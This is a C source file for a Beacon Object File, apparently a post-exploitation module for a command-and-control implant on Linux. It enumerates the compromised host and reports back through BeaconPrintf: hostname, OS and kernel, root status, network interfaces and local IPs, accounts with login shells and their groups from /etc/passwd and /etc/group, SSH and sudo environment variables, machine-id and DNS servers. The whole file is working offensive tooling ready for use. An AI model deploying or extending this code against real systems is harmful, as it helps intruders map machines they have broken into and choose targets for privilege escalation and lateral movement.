/// host_recon.c — System reconnaissance
/// gcc -c -o host_recon.o host_recon.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

struct linux_dirent64 {
    unsigned long long d_ino; long long d_off;
    unsigned short d_reclen; unsigned char d_type; char d_name[];
};

static void hdr(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 %s\n", s); }
static void sub(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x9c\xe2\x94\x80 %s\n", s); }
static void fin(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x94\xe2\x94\x80 %s\n\n", s); }
static void row(const char *k, const char *v) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-14s %s\n", k, v); }
static void ln(const char *s)  { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %s\n", s); }

static void read_trim(const char *path, char *buf, int cap) {
    buf[0] = '\0';
    char *d = (char*)0; int n = AxReadFileToBuffer(path, &d, cap);
    if (n > 0 && d) {
        if (n >= cap) n = cap - 1;
        AxMemcpy(buf, d, n); buf[n] = '\0';
        while (n > 0 && (buf[n-1]=='\n'||buf[n-1]=='\r')) buf[--n] = '\0';
        AxFree(d);
    }
}

typedef struct { char *data; int len; int pos; } lineiter_t;
static int next_line(lineiter_t *it, char *out, int cap) {
    if (it->pos >= it->len) return 0;
    int i = 0;
    while (it->pos < it->len && it->data[it->pos] != '\n') {
        if (i < cap - 1) out[i++] = it->data[it->pos];
        it->pos++;
    }
    if (it->pos < it->len) it->pos++;
    out[i] = '\0';
    return 1;
}

static int split(char *line, char delim, char **fields, int maxf) {
    int n = 0; fields[0] = line;
    for (char *p = line; *p && n < maxf - 1; p++) {
        if (*p == delim) { *p = '\0'; fields[++n] = p + 1; }
    }
    return n + 1;
}

/* Parse "0-15" or "0-3,5-7" from /sys/devices/system/cpu/present → total count */
static int parse_cpu_range(const char *s) {
    int total = 0;
    while (*s) {
        while (*s == ' ' || *s == ',') s++;
        if (!*s) break;
        int lo = 0; while (*s >= '0' && *s <= '9') { lo = lo*10+(*s-'0'); s++; }
        int hi = lo;
        if (*s == '-') { s++; hi = 0; while (*s >= '0' && *s <= '9') { hi = hi*10+(*s-'0'); s++; } }
        total += hi - lo + 1;
    }
    return total;
}

static void system_info(void) {
    char buf[512];
    hdr("System Information");

    read_trim("/proc/sys/kernel/hostname", buf, 256);
    if (buf[0]) row("Hostname", buf);

    read_trim("/proc/sys/kernel/domainname", buf, 256);
    if (buf[0] && AxStrcmp(buf,"(none)") != 0) row("Domain", buf);

    char *os = (char*)0; int ol = AxReadFileToBuffer("/etc/os-release", &os, 4096);
    if (ol > 0 && os) {
        char *pn = AxStrstr(os, "PRETTY_NAME=");
        if (pn) {
            pn += 12; if (*pn == '"') pn++;
            char *e = AxStrchr(pn, '"'); if (!e) e = AxStrchr(pn, '\n');
            if (e) { int l = (int)(e-pn); if(l>255)l=255; AxMemcpy(buf,pn,l); buf[l]='\0'; row("OS", buf); }
        }
        AxFree(os);
    }

    char *ver = (char*)0; int vl = AxReadFileToBuffer("/proc/version", &ver, 512);
    if (vl > 0 && ver) {
        char *sp = AxStrstr(ver, " ("); if (sp) *sp = '\0';
        if (ver[vl-1]=='\n') ver[vl-1]='\0';
        row("Kernel", ver); AxFree(ver);
    }

#if defined(__x86_64__)
    row("Arch", "x86_64");
#elif defined(__aarch64__)
    row("Arch", "aarch64");
#elif defined(__arm__)
    row("Arch", "arm");
#elif defined(__i386__)
    row("Arch", "i386");
#else
    row("Arch", "unknown");
#endif

    char *up = (char*)0; int ul = AxReadFileToBuffer("/proc/uptime", &up, 64);
    if (ul > 0 && up) {
        long s = 0; char *p = up;
        while (*p >= '0' && *p <= '9') { s = s*10+(*p-'0'); p++; }
        AxSnprintf(buf, sizeof(buf), "%ldd %ldh %ldm", s/86400, (s%86400)/3600, (s%3600)/60);
        row("Uptime", buf); AxFree(up);
    }

    // CPU model: read only first entry from /proc/cpuinfo (small read is enough)
    char *cpu = (char*)0; int cl = AxReadFileToBuffer("/proc/cpuinfo", &cpu, 2048);
    if (cl > 0 && cpu) {
        char *m = AxStrstr(cpu, "model name");
        if (m) { char *c = AxStrchr(m,':'); if(c){c++;while(*c==' ')c++;
            char *e=AxStrchr(c,'\n');if(e)*e='\0'; row("CPU", c); } }
        AxFree(cpu);
    }

    // CPU count: use /sys/devices/system/cpu/present (handles any number of CPUs)
    char cpurange[64];
    read_trim("/sys/devices/system/cpu/present", cpurange, sizeof(cpurange));
    if (cpurange[0]) {
        int ncpu = parse_cpu_range(cpurange);
        AxSnprintf(buf, sizeof(buf), "%d (%s)", ncpu, cpurange);
    } else {
        AxStrcpy(buf, "?");
    }
    row("CPUs", buf);

    char *mem = (char*)0; int ml = AxReadFileToBuffer("/proc/meminfo", &mem, 4096);
    if (ml > 0 && mem) {
        long total=0, avail=0;
        char *mt=AxStrstr(mem,"MemTotal:");
        char *mf=AxStrstr(mem,"MemAvailable:");
        if(mt){mt+=9;while(*mt==' ')mt++;while(*mt>='0'&&*mt<='9'){total=total*10+(*mt-'0');mt++;}}
        if(mf){mf+=13;while(*mf==' ')mf++;while(*mf>='0'&&*mf<='9'){avail=avail*10+(*mf-'0');mf++;}}
        AxSnprintf(buf,sizeof(buf),"%ld MB / %ld MB free", total/1024, avail/1024);
        row("Memory", buf); AxFree(mem);
    }

    AxSnprintf(buf,sizeof(buf),"%d", AxGetPid()); row("PID", buf);
    AxSnprintf(buf,sizeof(buf),"uid=%d euid=%d%s", AxGetUid(), AxGetEuid(),
               AxGetEuid()==0?" (root)":"");
    row("Identity", buf);

    char cwd[256];
    if (AxGetCwd(cwd, sizeof(cwd)) > 0) row("CWD", cwd);
}

static void enum_interfaces(void) {
    sub("Network Interfaces");

    char *dev = (char*)0;
    int dl = AxReadFileToBuffer("/proc/net/dev", &dev, 65536);
    if (dl <= 0 || !dev) return;

    lineiter_t it = {dev, dl, 0};
    char line[512]; int ln_n = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-12s %-18s %-12s %-12s\n",
                 "IFACE", "MAC", "RX bytes", "TX bytes");

    while (next_line(&it, line, sizeof(line))) {
        ln_n++;
        if (ln_n <= 2) continue;
        char *p = line; while(*p==' '||*p=='\t') p++;
        char *colon = AxStrchr(p, ':');
        if (!colon) continue;
        char iface[32]; int il=(int)(colon-p); if(il>31)il=31;
        AxMemcpy(iface, p, il); iface[il] = '\0';

        char *n = colon+1; while(*n==' ')n++;
        long rx=0; while(*n>='0'&&*n<='9'){rx=rx*10+(*n-'0');n++;}
        for(int i=0;i<7;i++){while(*n==' ')n++;while(*n>='0'&&*n<='9')n++;}
        while(*n==' ')n++;
        long tx=0; while(*n>='0'&&*n<='9'){tx=tx*10+(*n-'0');n++;}

        char mac_path[128], mac[32];
        AxSnprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", iface);
        read_trim(mac_path, mac, sizeof(mac));
        if (!mac[0]) AxStrcpy(mac, "-");

        BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-12s %-18s %-12ld %-12ld\n",
                     iface, mac, rx, tx);
    }
    AxFree(dev);

    // Local IPv4 from /proc/net/fib_trie (LOCAL /32), deduplicated
    char *trie = (char*)0; int tl = AxReadFileToBuffer("/proc/net/fib_trie", &trie, 131072);
    if (tl > 0 && trie) {
        char seen[32][20]; int nseen = 0;

        BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82\n");
        BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  Local IPv4:\n");
        lineiter_t it2 = {trie, tl, 0};
        char prev[128] = "", cur[256];
        while (next_line(&it2, cur, sizeof(cur))) {
            if (AxStrstr(cur, "/32 host LOCAL")) {
                char *dash = AxStrstr(prev, "|-- ");
                if (!dash) dash = AxStrstr(prev, "+-- ");
                if (dash) {
                    dash += 4;
                    char *end = dash; while(*end && *end != ' ') end++;
                    char ip[20]; int il2=(int)(end-dash); if(il2>19)il2=19;
                    AxMemcpy(ip, dash, il2); ip[il2]='\0';

                    // skip loopback + dedup
                    if (AxStrcmp(ip, "127.0.0.1") != 0) {
                        int dup = 0;
                        for (int i = 0; i < nseen; i++)
                            if (AxStrcmp(seen[i], ip) == 0) { dup = 1; break; }
                        if (!dup && nseen < 32) {
                            AxStrcpy(seen[nseen++], ip);
                            char b[40]; AxSnprintf(b, sizeof(b), "  %s", ip); ln(b);
                        }
                    }
                }
            }
            AxStrcpy(prev, cur);
        }
        AxFree(trie);
    }
}

static void enum_users(void) {
    char *pw = (char*)0; int pl = AxReadFileToBuffer("/etc/passwd", &pw, 524288);
    if (pl <= 0 || !pw) return;

    char *gr = (char*)0; int gl = AxReadFileToBuffer("/etc/group", &gr, 524288);

    sub("Users");
    BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-16s %-5s %-24s %-20s %s\n",
                 "USER", "UID", "HOME", "SHELL", "GROUPS");

    lineiter_t it = {pw, pl, 0};
    char line[1024];
    int count = 0;

    while (next_line(&it, line, sizeof(line))) {
        char *f[7]; int nf = split(line, ':', f, 7);
        if (nf < 7) continue;

        int sl = AxStrlen(f[6]);
        if ((sl>=7 && AxStrncmp(f[6]+sl-7,"nologin",7)==0) ||
            (sl>=5 && AxStrncmp(f[6]+sl-5,"false",5)==0) ||
            AxStrcmp(f[6],"/bin/sync")==0)
            continue;

        char groups[256]; groups[0] = '\0';
        if (gr && gl > 0) {
            lineiter_t git = {gr, gl, 0};
            char gline[512];
            int gcount = 0;
            while (next_line(&git, gline, sizeof(gline))) {
                char *gf[4]; int gnf = split(gline, ':', gf, 4);
                if (gnf < 4 || gf[3][0] == '\0') continue;
                int ulen = AxStrlen(f[0]);
                char *search = gf[3];
                while (search) {
                    if (AxStrncmp(search, f[0], ulen) == 0) {
                        char after = search[ulen];
                        if (after == ',' || after == '\0') {
                            if (gcount > 0 && AxStrlen(groups) < 240) AxStrcat(groups, ",");
                            if (AxStrlen(groups) + AxStrlen(gf[0]) < 250) AxStrcat(groups, gf[0]);
                            gcount++;
                            break;
                        }
                    }
                    search = AxStrchr(search, ',');
                    if (search) search++;
                }
            }
        }

        BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-16s %-5s %-24s %-20s %s\n",
                     f[0], f[2], f[5], f[6], groups);
        count++;
    }

    if (gr) AxFree(gr);
    AxFree(pw);
    char s[32]; AxSnprintf(s,sizeof(s),"%d users", count); ln(s);
}

static void enum_env(void) {
    sub("Environment");
    const char *vars[] = {
        "PATH", "HOME", "USER", "SHELL", "LANG", "TERM",
        "SSH_CONNECTION", "SSH_CLIENT", "DISPLAY", "XDG_SESSION_TYPE",
        "SUDO_USER", "SUDO_COMMAND",
        (const char*)0
    };
    for (int i = 0; vars[i]; i++) {
        char val[512];
        if (AxGetEnv(vars[i], val, sizeof(val)) > 0) {
            if (AxStrlen(val) > 80) { val[77]='.'; val[78]='.'; val[79]='.'; val[80]='\0'; }
            char b[600]; AxSnprintf(b, sizeof(b), "%-20s %s", vars[i], val);
            ln(b);
        }
    }
}

static void misc_info(void) {
    char buf[256];
    sub("Additional");

    read_trim("/etc/timezone", buf, 64);
    if (buf[0]) row("Timezone", buf);

    read_trim("/etc/machine-id", buf, 64);
    if (buf[0]) row("Machine ID", buf);

    char *dns = (char*)0; int dl = AxReadFileToBuffer("/etc/resolv.conf", &dns, 8192);
    if (dl > 0 && dns) {
        lineiter_t it = {dns, dl, 0};
        char line[256];
        while (next_line(&it, line, sizeof(line))) {
            if (AxStrncmp(line, "nameserver", 10) == 0) {
                char *p = line + 10; while(*p==' '||*p=='\t') p++;
                row("DNS", p);
            }
        }
        AxFree(dns);
    }
}

void go(char *args, int args_len) {
    system_info();
    enum_interfaces();
    enum_users();
    enum_env();
    misc_info();
    fin("Recon complete");
}
